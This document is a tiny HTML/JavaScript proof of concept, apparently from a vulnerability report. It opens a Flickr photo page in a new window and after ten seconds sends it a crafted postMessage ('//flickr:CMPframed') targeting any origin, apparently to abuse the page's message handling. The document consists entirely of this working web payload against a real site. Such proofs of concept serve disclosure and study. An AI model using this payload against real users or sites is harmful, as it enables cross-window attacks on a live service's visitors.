
<script> function poc(){ window.win=window.open('https://www.flickr.com/photos/195182863@N03'); var msg='//flickr:CMPframed'; setTimeout(function(){win.postMessage(msg,'*');}, 10000); } </script> <a href="#" onclick="poc();">PoC</a>
